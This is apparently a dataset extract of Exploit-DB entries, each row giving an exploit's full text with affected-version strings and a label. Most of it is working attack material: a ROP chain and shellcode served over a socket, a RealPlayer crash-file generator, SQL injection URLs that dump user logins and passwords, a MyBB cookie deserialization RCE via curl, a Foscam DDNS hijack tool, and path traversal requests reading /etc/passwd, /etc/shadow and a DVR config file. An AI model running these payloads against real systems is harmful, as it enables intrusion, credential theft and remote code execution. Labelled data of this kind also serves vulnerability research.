ecx,ecx # ret  # Add offset to shellcode  ROP += 	struct.pack('<I',0x8fe2def4)					# add eax,ecx # ret  # Swap back ROP += 	struct.pack('<I',0x8fe0e32d)					# xchg eax,edx  # Copy parameter to placeholder ROP += 	struct.pack('<I',0x8fe2fb61)					# mov [eax],edx # pop eax # ret ROP += 	'G'*4																	# junk  # ==================== Call strcpy function ====================   # Set our Stack pointer back to original value  ROP += 	struct.pack('<I',0x8fe0e32d)					# xchg eax,edx ROP += 	struct.pack('<I',0x8fe2daea)					# sub eax,ecx # ret  # Return execution to our strdup call above ROP += 	struct.pack('<I',0x8fe0b1c2)					# xchg eax,ebp # inc ebp # ret  ROP += 	struct.pack('<I',0x8fe2b6a5)					# dec ebp # ret ROP += 	struct.pack('<I',0xffff01f3)					# mov esp,ebp # pop ebp # ret ROP += 	'G'*4																	# junk  # ==================== Call Exploit code from heap ====================    sploit = ""001 :"" sploit += ""\x41"" * 528 sploit += ROP sploit += '\x90' * 10 sploit += shellcode sploit += ""\x0d\x0a""  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind(('', 6667)) s.listen(1) print (""[*] Listening on port 6667."") print (""[*] Have someone connect to you."") print (""[*] Type [control]-c to exit."") conn, addr = s.accept() print '[*] Received connection from: ', addr  conn.send(sploit) conn.close","['2.2.1', 'v2.2.1']",0
32956,"RealNetworks RealPlayer Gold 10.0 MP3 - File Handling Remote Denial of Service source: https://www.securityfocus.com/bid/34719/info  RealNetworks RealPlayer is prone to a remote denial-of-service vulnerability because the application fails to handle specially crafted files.  Exploiting this issue allows remote attackers to crash the application, denying further service to legitimate users.  RealPlayer 10 Gold is vulnerable; other versions may also be affected.   #!/usr/bin/python  import sys,os  #RealPlayer MP3 DoS PoC by AbdulAziz Hariri - ahariri@insight-tech.org  mp3_file =  (""\x49\x44\x33\x00\x00\x00\x00\x00\x09\x07\x41\x41\x41\x41\x00\x00\x00\x08\x00\x00\x00""+ ""\x50\x69\x73\x74\x65\x20\x35\x54\x50\x45\x31\x00\x00\x00\x05\x00\x00\x00\x41\x6e""+ ""\x69\x73\x54\x41\x4c\x42\x00\x00\x00\x0d\x00\x00\x00\x41\x41\x41\x41""+ ""\x44\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""  + ""\x41""*2000)  try: f = open(""foo.mp3"",""w"") try: f.write(mp3_file) finally: f.close() except IOError: pass  print ""[x] Try loading foo.mp3""",['10'],1
2834,"Recipes Complete Website 1.1.14 - SQL Injection *************************************************************************************************************************#                                                               					          		 # 			               			 Coding 4 Fun     						 #	 			                                      						  		 # *************************************************************************************************************************# 													  		 # * Recipes Complete Website 1.1.14  (http://www.easysitenetwork.com/modules.php?name=Content&pa=showpage&pid=2) ; 	 # 													  		 #	 * Class = SQL Injection ;										  		 #    													  		 # * Download = http://www.easysitenetwork.com/modules.php?name=Downloads&d_op=getit&lid=3 ;				 # 													  		 # * Found by = GregStar (gregstar[at]c4f[dot]pl) (http://c4f.pl) ;				          		 # 												  	  		 # -------------------------------------------------------------------------------------------------------------------------# 													  		 # 													  		 # - PoC:												          		 # 													  		 # http://[target]/[path]/recipe.php?recipeid=-1%20UNION%20SELECT%20login,password,0,0,0,0%20FROM%20users%20/* 		 # 															 # -------------------------------------------------------------------------------------------------------------------------# http://[target]/[path]/list.php?pagenum=0&categoryid=-1%20UNION%20SELECT%200,login,0,0%20FROM%20users%20/*  - login      #											   													  		 # -------------------------------------------------------------------------------------------------------------------------# http://[target]/[path]/list.php?pagenum=0&categoryid=-1%20UNION%20SELECT%200,password,0,0%20FROM%20users%20/* - password # 															 # *************************************************************************************************************************#													  				 Gr33tz:  sASAn,marcel3miasto,masS,kaziq,Abi,kociaq,SlashBeast,chochlik,rfl,d3m0n,java,reyw,kw@ch.	  		 # 												          		 # *************************************************************************************************************************#  # milw0rm.com [2006-11-23]",['1.1.14'],1
41150,"MyBB < 1.8.3 (with PHP 5.6 < 5.6.11) - Remote Code Execution #GMP Deserialization Type Confusion Vulnerability [MyBB <= 1.8.3 RCE Vulnerability]  Taoguang Chen <[@chtg57](https://twitter.com/chtg57)> - Write Date: 2015.4.28 - Release Date: 2017.1.20  > A type-confusion vulnerability was discovered in GMP deserialization with crafted object's __wakeup() magic method that can be abused for updating any already assigned properties of any already created objects, this result in serious security issues.  Affected Versions ------------ Affected is PHP 5.6 < 5.6.30  Credits ------------ This vulnerability was disclosed by Taoguang Chen.  Description ------------ gmp.c ``` static int gmp_unserialize(zval **object, zend_class_entry *ce, const unsigned char *buf, zend_uint buf_len, zend_unserialize_data *data TSRMLS_DC) /* {{{ */ { 	... 	ALLOC_INIT_ZVAL(zv_ptr); 	if (!php_var_unserialize(&zv_ptr, &p, max, &unserialize_data TSRMLS_CC) 		|| Z_TYPE_P(zv_ptr) != IS_ARRAY 	) { 		zend_throw_exception(NULL, ""Could not unserialize properties"", 0 TSRMLS_CC); 		goto exit; 	}  	if (zend_hash_num_elements(Z_ARRVAL_P(zv_ptr)) != 0) { 		zend_hash_copy( 			zend_std_get_properties(*object TSRMLS_CC), Z_ARRVAL_P(zv_ptr), 			(copy_ctor_func_t) zval_add_ref, NULL, sizeof(zval *) 		); 	} ```  zend_object_handlers.c ``` ZEND_API HashTable *zend_std_get_properties(zval *object TSRMLS_DC) /* {{{ */ { 	zend_object *zobj; 	zobj = Z_OBJ_P(object); 	if (!zobj->properties) { 		rebuild_object_properties(zobj); 	} 	return zobj->properties; } ```  It has been demonstrated many times before that __wakeup() or other magic methods leads to `ZVAL` was changed from the memory in during deserializtion. So an attacker can change `**object` into an integer-type or bool-type `ZVAL`, then the attacker will be able to access any objects that stored in objects store via `Z_OBJ_P`. This means the attacker will be able to update any properties in the object via zend_hash_copy(). It is possible to lead to various problems and including security issues.  The following codes will prove this vulnerability: ``` <?php  class obj { 	var $ryat; 	 	function __wakeup() 	{ 		$this->ryat = 1; 	} }  $obj = new stdClass; $obj->aa = 1; $obj->bb = 2;  $inner = 's:1:""1"";a:3:{s:2:""aa"";s:2:""hi"";s:2:""bb"";s:2:""hi"";i:0;O:3:""obj"":1:{s:4:""ryat"";R:2;}}'; $exploit = 'a:1:{i:0;C:3:""GMP"":'.strlen($inner).':{'.$inner.'}}'; $x = unserialize($exploit); var_dump($obj);  ?> ```  Expected result: ``` object(stdClass)#1 (2) {   [""aa""]=>   int(1)   [""bb""]=>   int(2) } ```  Actual result: ``` object(stdClass)#1 (3) {   [""aa""]=>   string(2) ""hi""   [""bb""]=>   string(2) ""hi""   [0]=>   object(obj)#3 (1) {     [""ryat""]=>     &int(1)   } } ```  **i) How to exploited this bug in real world?**  When PHP 5.6 <= 5.6.11, DateInterval's __wakeup() use convert_to_long() handles and reassignments its properties (it has been demonstrated many times), so an attacker can convert GMP object to an any integer-type `ZVAL` via GMP's gmp_cast_object():  ``` static int gmp_cast_object(zval *readobj, zval *writeobj, int type TSRMLS_DC) /* {{{ */ {     mpz_ptr gmpnum;     switch (type) {     ...     case IS_LONG:         gmpnum = GET_GMP_FROM_ZVAL(readobj);         INIT_PZVAL(writeobj);         ZVAL_LONG(writeobj, mpz_get_si(gmpnum));         return SUCCESS; ```  The following codes will prove this exploite way: ``` <?php  var_dump(unserialize('a:2:{i:0;C:3:""GMP"":17:{s:4:""1234"";a:0:{}}i:1;O:12:""DateInterval"":1:{s:1:""y"";R:2;}}'));  ?> ``` Of course, a crafted __wakeup() can also be exploited, ex:  ``` <?php  function __wakeup() {     $this->ryat = (int) $this->ryat; }  ?> ```  **ii) Can be exploited this bug in real app?**  Exploited the bug in MyBB:  index.php ``` 	if(isset($mybb->cookies['mybb']['forumread'])) 	{ 		$forumsread = my_unserialize($mybb->cookies['mybb']['forumread']); 	} ```  MyBB <= 1.8.3 allow deserialized cookies via unserialize(), so an attacker will be able to update `$mybb` or other object's any properties, and it is possible to lead to security issues easily, ex: xss, sql injection, remote code execution and etc. :-)  **P.S. I had reported this vulnerability and it had been fixed in mybb >= 1.8.4.**  Proof of Concept Exploit ------------ **MyBB <= 1.8.3 RCE vulnerability**  index.php ``` eval('$index = ""'.$templates->get('index').'"";'); ```  MyBB always use eval() function in during template parsing.  inc/class_templates.php ``` class templates { 	... 	public $cache = array(); 	... 	function get($title, $eslashes=1, $htmlcomments=1) 	{ 		global $db, $theme, $mybb; 		... 		$template = $this->cache[$title]; 		... 		return $template; 	} ```  If we can control the `$cache`, we will be albe to inject PHP code via eval() function.  inc/init.php ``` $error_handler = new errorHandler(); ... $maintimer = new timer(); ... $mybb = new MyBB; ... switch($config['database']['type']) { 	case ""sqlite"": 		$db = new DB_SQLite; 		break; 	case ""pgsql"": 		$db = new DB_PgSQL; 		break; 	case ""mysqli"": 		$db = new DB_MySQLi; 		break; 	default: 		$db = new DB_MySQL; } ... $templates = new templates; ```  The `$templates` object was instantiated in init.php, and four objects was instantiated in this before. This means the `$templates` object's handle was set to `5` and stored into objects store, so we can access the `$templates` object and update the `$cache` property via convert GMP object into integer-type `ZVAL` that value is `5` in during GMP deserialization. This also means we can inject PHP code via eval() function.  When MyBB <= 1.8.3 and PHP 5.6 <= 5.6.11, remote code execution by just using curl on the command line: ``` curl --cookie 'mybb[forumread]=a:1:{i:0%3bC:3:""GMP"":106:{s:1:""5""%3ba:2:{s:5:""cache""%3ba:1:{s:5:""index""%3bs:14:""{${phpinfo()}}""%3b}i:0%3bO:12:""DateInterval"":1:{s:1:""y""%3bR:2%3b}}}}' http://127.0.0.1/mybb/ ```","['< 1.8.3 (with', '5.6 < 5.6.11)', '5.6', '5.6.11']",1
45451,"Joomla! Component AMGallery 1.2.3 - 'filter_category_id' SQL Injection # Exploit Title: Joomla! Component AMGallery 1.2.3 - 'filter_category_id' SQL Injection # Exploit Author: Ihsan Sencan # Dork: N/A # Date: 2018-09-18 # Vendor Homepage: http://arenam.ru/ # Software Link: https://extensions.joomla.org/extensions/extension/photos-a-images/galleries/amgallery/ # Version: 1.2.3 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: N/A # # # # #  # # # # # # POC:  #  # 1) # # # # #  #!/usr/bin/perl -w # # # # #  sub clear{ system(($^O eq 'MSWin32') ? 'cls' : 'clear'); } clear(); print "" ################################################################################         ______  _______ ___    _   __   _____ _______   ___________    _   __         /  _/ / / / ___//   |  / | / /  / ___// ____/ | / / ____/   |  / | / /         / // /_/ /\__ \/ /| | /  |/ /   \__ \/ __/ /  |/ / /   / /| | /  |/ /      _/ // __  /___/ / ___ |/ /|  /   ___/ / /___/ /|  / /___/ ___ |/ /|  /     /___/_/ /_//____/_/  |_/_/ |_/   /____/_____/_/ |_/\____/_/  |_/_/ |_/                                                                                +                                                      Joomla! Component AMGallery 1.2.3 - SQL Injection           ################################################################################ "";  use LWP::UserAgent; print ""\nTarget:[http://site.com/path/]: "";  chomp(my $target=<STDIN>); print ""\n[!] Exploiting Progress.....\n""; print ""\n""; $efe=""%2d%36%36%36%20%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%43%4f%4e%43%41%54%5f%57%53%28%30%78%32%30%33%61%32%30%2c%55%53%45%52%28%29%2c%44%41%54%41%42%41%53%45%28%29%2c%56%45%52%53%49%4f%4e%28%29%29%2c%32%23""; $b = LWP::UserAgent->new() or die ""Could not initialize browser\n""; $b->agent('Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'); $host = $target . ""?filter_category_id="".$efe.""""; $res = $b->request(HTTP::Request->new(GET=>$host)); $answer = $res->content; if ($answer =~/<h2 class=""amGalleryCatTitle"">(.*?)<\/h2>/){  print ""[+] Success !!!\n""; print ""\n[+] Detail : $1\n""; print ""\n""; } else{print ""\n[-]Not found.\n""; }",['1.2.3'],1
39195,"Foscam IP Camera - Predictable Credentials Security Bypass // source: https://www.securityfocus.com/bid/67510/info  Foscam IP Camera is prone to a security-bypass vulnerability.  An attacker can exploit this issue to gain access to sensitive information and perform certain unauthorized actions; this may lead to further attacks.  Foscam IP Camera 11.37.2.49 and prior versions are vulnerable.   /* * Copyright 2013 Artem Harutyunyan, Sergey Shekyan * * Licensed under the Apache License, Version 2.0 (the ""License""); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an ""AS IS"" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. * */  #include <string.h> #include <getopt.h> #include <stdio.h> #include <stdlib.h>  #include <sys/errno.h> #include <arpa/inet.h> #include <netdb.h>  #include ""camtool.h""  #define IP_BUF_LEN 16 #define RESP_BUF_LEN 1024 #define PORT_BUF_LEN 6  #define UNAME_LEN 6 #define DELIM 0x1  #define REQ_POS_PID 1 #define REQ_POS_UNAME 2 #define REQ_POS_PWD 3 #define REQ_POS_OEM 4 #define REQ_POS_DOMAIN_COUNT 5 #define REQ_POS_DOMAIN_0 6  #define RES_POS_PID 1 #define RES_POS_ERROR 2 #define RES_POS_MSG 3 #define RES_POS_DOMAIN_COUNT 4 #define RES_POS_DOMAIN_0 5 #define RES_ENT_SRV_COUNT 6 #define RES_ENT_SRV_0 7 #define RES_ENT_SRV_MPORT_0 8 #define RES_ENT_SRV_APORT_0 9  #define KEY_PID ""PID"" #define KEY_UNAME ""UName"" #define KEY_PWD ""PWD"" #define KEY_OEM ""OEM"" #define KEY_DOMAIN_COUNT ""DomainCount"" #define KEY_DOMAIN_0 ""Domain0"" #define KEY_ENT_SRV_0 ""EntServer0"" #define KEY_ENT_SRV_MPORT_0 ""EntServerMPort0""  static char initial_payload[] = {   0x01, 0x50, 0x49, 0x44, 0x3d, 0x31, 0x34, 0x01, 0x55, 0x4e, 0x61, 0x6d,   0x65, 0x3d, 0x63, 0x68, 0x31, 0x32, 0x36, 0x36, 0x01, 0x50, 0x57, 0x44,   0x3d, 0x63, 0x68, 0x31, 0x32, 0x36, 0x36, 0x01, 0x4f, 0x45, 0x4d, 0x3d,   0x72, 0x65, 0x65, 0x63, 0x61, 0x6d, 0x01, 0x44, 0x6f, 0x6d, 0x61, 0x69,   0x6e, 0x43, 0x6f, 0x75, 0x6e, 0x74, 0x3d, 0x31, 0x01, 0x44, 0x6f, 0x6d,   0x61, 0x69, 0x6e, 0x30, 0x3d, 0x63, 0x68, 0x31, 0x32, 0x36, 0x36, 0x2e,   0x6d, 0x79, 0x66, 0x6f, 0x73, 0x63, 0x61, 0x6d, 0x2e, 0x6f, 0x72, 0x67,   0x01, 0x00 };  static const unsigned int n_initial_payload = 85; static char redirect_payload[] = {   0x01, 0x50, 0x49, 0x44, 0x3d, 0x31, 0x30, 0x01, 0x55, 0x4e, 0x61, 0x6d,   0x65, 0x3d, 0x63, 0x68, 0x31, 0x32, 0x36, 0x36, 0x01, 0x50, 0x57, 0x44,   0x3d, 0x63, 0x68, 0x31, 0x32, 0x36, 0x36, 0x01, 0x4f, 0x45, 0x4d, 0x3d,   0x72, 0x65, 0x65, 0x63, 0x61, 0x6d, 0x01, 0x4f, 0x53, 0x3d, 0x4c, 0x69,   0x6e, 0x75, 0x78, 0x01, 0x42, 0x75, 0x69, 0x6c, 0x64, 0x4e, 0x4f, 0x3d,   0x31, 0x33, 0x38, 0x30, 0x01, 0x44, 0x6f, 0x6d, 0x61, 0x69, 0x6e, 0x30,   0x3d, 0x63, 0x68, 0x31, 0x32, 0x36, 0x36, 0x2e, 0x6d, 0x79, 0x66, 0x6f,   0x73, 0x63, 0x61, 0x6d, 0x2e, 0x6f, 0x72, 0x67, 0x01, 0x0 }; static const unsigned int n_redirect_payload = 93;  static int payload_get_offset_by_name(const char* name, const char buf[0], const unsigned int n_buf) {   const unsigned int n_name = strlen(name);   unsigned int i_name = 0;   unsigned int i = 0;    while (i < n_buf) {     while (name[i_name] == buf[i + i_name] && ((i + i_name) < n_buf) && (i_name < n_name))       ++i_name;      if (i_name == n_name)     return i;   else     i_name = 0;      ++i;  }    return -1; }  static int payload_insert_host(const char* host, const char* buf, const unsigned int n_buf) {      unsigned int i = 0;   unsigned int n_host = strlen(host);   int offset = 0;    // Make sure that hostname is exactly UNAME_LEN   while (i < n_host && (buf[++i] != DELIM)) {}   if (i != (UNAME_LEN + 1)) return -1;    // Insert hostname to payload   if ((offset = payload_get_offset_by_name(KEY_UNAME, buf, n_buf)) == -1) return 1;   memmove((void*) &buf[offset + strlen(KEY_UNAME) + 1], (const void*) host, UNAME_LEN);    // Insert pwd to payload   if ((offset = payload_get_offset_by_name(KEY_PWD, buf, n_buf)) == -1) return 1;   memmove((void*) &buf[offset + strlen(KEY_PWD) + 1], (const void*) host, UNAME_LEN);    // Insert domain to payload   if ((offset = payload_get_offset_by_name(KEY_DOMAIN_0, buf, n_buf)) == -1 || (offset + n_host) >= n_buf) return 1;   memmove((void*) &buf[offset + strlen(KEY_DOMAIN_0) + 1], (const void*) host, n_host);    return 0; }  static int payload_extract_ent_srv_0(const char** ip, unsigned int* n_ip, const char* payload, const unsigned int n_payload) {     unsigned int offset = payload_get_offset_by_name(KEY_ENT_SRV_0, payload, n_payload);     const unsigned int n_key_ent_srv = strlen(KEY_ENT_SRV_0);     if (memcmp(&payload[offset], KEY_ENT_SRV_0, n_key_ent_srv) != 0)       return 1;          offset += (n_key_ent_srv + 1); // +1 for '='     unsigned int ip_offset = offset;     while (offset < n_payload && payload[offset] != DELIM)       ++offset;      if (offset == n_payload)       return 1;      *ip = &payload[ip_offset];     *n_ip = offset - ip_offset;      return 0; }  static int payload_extract_ent_srv_port(const char** port_fwd, unsigned int* n_port_fwd, const char* payload, const unsigned int  n_payload) {   unsigned int offset = payload_get_offset_by_name(KEY_ENT_SRV_MPORT_0, payload, n_payload);   const unsigned int n_key_ent_srv_mport = strlen(KEY_ENT_SRV_MPORT_0);    if (memcmp(&payload[offset], KEY_ENT_SRV_MPORT_0, n_key_ent_srv_mport) != 0)     return 1;    offset += (n_key_ent_srv_mport + 1); // +1 for '='   unsigned int mport_offset = offset;      while (offset < n_payload && payload[offset] != DELIM)       ++offset;    if (offset == n_payload)     return 1;    *port_fwd = &payload[mport_offset];   *n_port_fwd = offset - mport_offset;    return 0; }  static int send_udp_payload (const char* payload, const unsigned int n_payload, const char* host, const unsigned short port,  int* sockfd, struct addrinfo** r) {     /* Create socket and get the data from DDNS server */     struct addrinfo hints = {0};     struct addrinfo* res = *r;     int ret = 0;     int nbytes = 0;       hints.ai_family = AF_INET;     hints.ai_socktype = SOCK_DGRAM;      if ((ret = getaddrinfo(host, NULL, &hints, &res)) != 0) {       fprintf(stderr, ""getaddrinfo: %s\n"", gai_strerror(ret));       return 1;     }       if ((*sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol)) == -1) {       fprintf(stderr, ""socket() failed: %s\n"", strerror(errno));       return 1;     }            struct sockaddr_in *ipv4 = (struct sockaddr_in*) res->ai_addr;     ipv4->sin_port = htons(port);      /* Send the request */     if ((nbytes = sendto(*sockfd, payload, n_payload, 0, res->ai_addr, sizeof *(res->ai_addr))) != n_payload) {       fprintf(stderr, ""sendto() failed: %s\n"", strerror(errno));       return 1;     }        *r = res;     return 0; }  static void usage() {     fprintf(stdout,             ""Tool for packing WebUI firmware.\n""             ""Usage: uipack -d <dir> -o <output file>\n""             ""\t-s DDNS server name\n""             ""\t-a camera hostname\n""             ""\t-i IP address to register\n""             ""\t-h print this message\n""); }  int main( int argc, char** argv) {      if (argc < 4) {         usage();         return 1;     }       char ddns[MAX_HOSTNAME_LEN] = {0};     char camera_name[MAX_HOSTNAME_LEN] = {0};     char ip[IP_BUF_LEN] = {0};      char o = 0;     while ((o = getopt(argc, argv, "":s:a:i:h"")) != -1) {         switch(o) {         case 's':             if (strlen(optarg) > MAX_HOSTNAME_LEN - 1) {                 fprintf(stderr, ""%s can not be longer than %d\n"", optarg, MAX_HOSTNAME_LEN - 1);                 return 1;             }             strncpy(ddns, optarg, MAX_HOSTNAME_LEN);             break;         case 'a':             if (strlen(optarg) > MAX_HOSTNAME_LEN - 1) {                 fprintf(stderr, ""%s can not be longer than %d\n"", optarg, MAX_HOSTNAME_LEN - 1);                 return 1;             }             strncpy(camera_name, optarg, MAX_HOSTNAME_LEN);             break;         case 'i':             if (strlen(optarg) > IP_BUF_LEN - 1) {                 fprintf(stderr, ""%s can not be longer than %d\n"", optarg, IP_BUF_LEN - 1);                 return 1;             }             strncpy(ip, optarg, IP_BUF_LEN);             break;         case 'h':             usage();             return 0;         case '?':             fprintf(stderr, ""Illegal option -%c\n"", optopt);             usage();             return 1;         defalt:             fprintf(stderr, ""Option -%c requires an argument.\n"", optopt);             usage();             return 1;         }     }      if (strlen(ddns) == 0|| strlen(camera_name) == 0 || strlen(ip) == 0) {         usage();         return 1;     }         /* Insert hostname into payload */     if (payload_insert_host(camera_name, initial_payload, n_initial_payload) != 0) {       fprintf(stderr, ""Could not insert hostname into the payload"");       return 1;     }        /* Send payload to DDNS */     int sockfd = 0;     struct addrinfo* res = NULL;     if (send_udp_payload (initial_payload, n_initial_payload, ddns, 8080, &sockfd, &res) != 0) {       fprintf(stderr, ""Could not send UDP payload to %s"", ddns);       return 1;     }      /* Get the response */     char resp[RESP_BUF_LEN] = {0};     int n_resp;     unsigned int fromlen = sizeof *(res->ai_addr);     if ((n_resp = recvfrom(sockfd, resp, RESP_BUF_LEN, 0, res->ai_addr, &fromlen)) == -1) {       fprintf(stderr, ""recvfrom() failed: %s\n"", strerror(errno));       return 1;     }     fprintf(stderr, ""Got %d bytes\n"", n_resp);     freeaddrinfo(res);      /* Make sure it's a redirect */      /* Extract the server name */     const char* ip_fwd = NULL;     unsigned int n_ip_fwd = 0;;     char str_ip_fwd[IP_BUF_LEN] = {0};     if (payload_extract_ent_srv_0(&ip_fwd, &n_ip_fwd, resp, n_resp) != 0) {       fprintf(stderr, ""Could not extract IP server from the response\n"");       return 1;     }     memmove(str_ip_fwd, ip_fwd, n_ip_fwd);     fprintf(stderr, ""IP of the redirect server is: %s\n"", str_ip_fwd);      /* Extract port */     const char* port_fwd = 0;     unsigned int n_port_fwd = 0;     char str_port_fwd[PORT_BUF_LEN] = {0};     if (payload_extract_ent_srv_port(&port_fwd, &n_port_fwd, resp, n_resp) != 0) {       fprintf(stderr, ""Could not extract port from the response\n"");       return 1;     }     memmove(str_port_fwd, port_fwd, n_port_fwd);     fprintf(stderr, ""Port of the redirect server is: %s\n"", str_port_fwd);          /* Update redirect payload and send to DDNS */     if (payload_insert_host(camera_name, redirect_payload, n_redirect_payload) != 0) {       fprintf(stderr, ""Could not insert hostname into the redirect payload"");       return 1;     }        sockfd = 0;     res = NULL;     if (send_udp_payload(redirect_payload, n_redirect_payload, str_ip_fwd, atoi(str_port_fwd), &sockfd, &res) != 0) {       fprintf(stderr, ""Could not send UDP payload to %s"", str_ip_fwd);       return 1;     }      return 0; }","['11.37.2.49', 'prior versions']",1
29959,"TVT TD-2308SS-B DVR - Directory Traversal # Exploit Title: TVT TD-2308SS-B DVR directory traversal # Shodan Dork: ""Cross Web Server"" # Date: 01 Dec 2013 # Disclosure date: 10 Sep 2013 # Exploit Author: Cesar Neira # Vendor Homepage: http://en.tvt.net.cn/ # Affected Firmware Versions: 3.1.43.B 3.1.43.P 3.1.6.P-1.0.2.1-03 3.1.75.B-1.0.2.1-00 3.1.7.B-1.0.2.1-00 3.1.81.B-1.0.2.1-00 3.1.83.B-1.0.2.1-00 3.1.83.P-1.0.4.2-03 3.1.87.P-1.0.4.2-17 3.1.91.P-1.0.2.1-03 3.1.92.P-1.0.2.1-00 3.1.93.B-1.0.2.1-17 3.2.0.B-1.0.2.1-17 3.2.0.P-1.0.2.1-03 3.2.0.P-1.0.2.1-17 3.2.0.P-1.0.6.0.32-00 3.2.0.P-3520A-00 3.2.0.P-3520A-03 3.2.0.P-3531-00 3.2.0.P-3531-11 3.2.0.P-FH-00 3.2.9.P-3520A-06 maybe others. # Tested on: TVT DVR TD-2308SS-B # CVE : CVE-2013-6023 # References: http://www.kb.cert.org/vuls/id/785838 http://alguienenlafisi.blogspot.com/2013/10/dvr-tvt-directory-traversal.html  POC:  curl http://[IP Address]/../../../mnt/mtd/config/config.dat 2>/dev/null | strings  --  Cesar Neira <csar.1603@gmail.com> http://alguienenlafisi.blogspot.com Root-Node   Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/29959.nse",['DVR'],1
37442,"CollabNet Subversion Edge Management 4.0.11 - Local File Inclusion # Vuln Title: Local file inclusion in CollabNet Subversion Edge Management # Frontend via logfile ""fileName"" parameter of the ""tail"" action # # Date: 28.06.2015 # Author: otr # Software Link: https://www.open.collab.net/downloads/svnedge # Vendor: CollabNet # Version: 4.0.11 # Tested on: Fedora Linux # Type: Local file inclusion # # Risk: Medium # Status: public/fixed # Fixed version: 5.0  Timeline:  2014-10-09 Flaw Discovered 2014-10-20 Vendor contacted 2014-10-21 Vendor response 2014-12-08 Vendor fix proposal 2014-12-08 Extension of embargo to 19.4.2015 2015-05-04 Extension of embargo until release of version 5.0 2015-05-18 Release of version 5.0 and public disclosure  Summary:  The CollabNet Subversion Edge Management Frontend allows authenticated admins to read arbitrary local files via logfile ""fileName"" parameter of the ""tail"" action  Vulnerability:    Sample URL:     https://example.com:4434/csvn/log/tail?fileName=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&startIndex=0  Fix proposal:  Remove feature or santizes the fileName parameter so that no path traversals and arbitrary file inclusions are possible.  Vendor fix:  [...] now allow only showing hooks/logs within the intended directories.  ####################################################################  # Vuln Title: Local file inclusion in CollabNet Subversion Edge Management # Frontend via logfile ""listViewItem"" parameter of the ""index"" action # # Date: 28.06.2015 # Author: otr # Software Link: https://www.open.collab.net/downloads/svnedge # Vendor: CollabNet # Version: 4.0.11 # Tested on: Fedora Linux # Type: Local file inclusion # # Risk: Medium # Status: public/fixed # Fixed version: 5.0  Timeline:  2014-10-09 Flaw Discovered 2014-10-20 Vendor contacted 2014-10-21 Vendor response 2014-12-08 Vendor fix proposal 2014-12-08 Extension of embargo to 19.4.2015 2015-05-04 Extension of embargo until release of version 5.0 2015-05-18 Release of version 5.0 and public disclosure  Summary:  The CollabNet Subversion Edge Management Frontend allows authenticated admins to read arbitrary local files via logfile ""listViewItem"" parameter of the ""index"" action  Vulnerability:    Request:     POST /csvn/repo/index HTTP/1.1     Host: example.com:4434     [...]      id=1&datatable_length=10&listViewItem_../../../../../../etc/passwd=on&_confirmDialogText_copyHook=&_confirmDialogText_renameHook=&_action_downloadHook=Download    Response:      HTTP/1.1 200 OK     Content-Type: text/plain     Content-disposition: attachment;filename=""../../../../../../etc/passwd""     Content-Length: 1825      root:x:0:0:root:/root:/bin/bash  Fix proposal:  Remove feature or santizes the ""listViewItem"" parameter so that no path traversals and arbitrary file inclusions are possible.  Vendor fix:  [...] now allow only showing hooks/logs within the intended directories.  ####################################################################  # Vuln Title: Local file inclusion in CollabNet Subversion Edge Management # Frontend via ""fileName"" parameter of the show action # # Date: 10.10.2014 # Author: otr # Software Link: https://www.open.collab.net/downloads/svnedge # Vendor: CollabNet # Version: 4.0.11 # Tested on: Fedora Linux # Type: Local file inclusion # # Risk: Medium # Status: public/fixed # Fixed version: 5.0  Timeline:  2014-10-09 Flaw Discovered 2014-10-20 Vendor contacted 2014-10-21 Vendor response 2014-12-08 Vendor fix proposal 2014-12-08 Extension of embargo to 19.4.2015 2015-05-04 Extension of embargo until release of version 5.0 2015-05-18 Release of version 5.0 and public disclosure  Summary:  The CollabNet Subversion Edge Management Frontend allows authenticated admins to read arbitrary local files via logfile ""fileName"" parameter of the show action  Vulnerability:    Request:     GET /csvn/log/show?fileName=../../../../../../etc/shadow HTTP/1.1     Host: example.com:4434    Response:     HTTP/1.1 200 OK     [...]     <div class=""span3"">../../../../../../etc/passwd</div>     [...]     root:x:0:0:root:/root:/bin/bash  Fix proposal:  Remove feature or santizes the fileName parameter so that no path traversals and arbitrary file inclusions are possible.  Vendor fix:  [...] now allow only showing hooks/logs within the intended directories.  ####################################################################  # Vuln Title: Local file inclusion in CollabNet Subversion Edge Management # Frontend via logfile ""filename"" parameter of the ""downloadHook"" action # # Date: 28.06.2015 # Author: otr # Software Link: https://www.open.collab.net/downloads/svnedge # Vendor: CollabNet # Version: 4.0.11 # Tested on: Fedora Linux # Type: Local file inclusion # # Risk: Medium # Status: public/fixed # Fixed version: 5.0  Timeline:  2014-10-09 Flaw Discovered 2014-10-20 Vendor contacted 2014-10-21 Vendor response 2014-12-08 Vendor fix proposal 2014-12-08 Extension of embargo to 19.4.2015 2015-05-04 Extension of embargo until release of version 5.0 2015-05-18 Release of version 5.0 and public disclosure  Summary:  The CollabNet Subversion Edge Management Frontend allows authenticated admins to read arbitrary local files via logfile ""filename"" parameter of the ""downloadHook"" action  Vulnerability:    Example URL:     https://example.com:4434/csvn/repo/downloadHook/1?filename=../../../../../../etc/passwd  Fix proposal:  Remove feature or santizes the ""filename"" parameter so that no path traversals and arbitrary file inclusions are possible.  Vendor fix:  [...] now allow only showing hooks/logs within the intended directories.",['4.0.11'],1
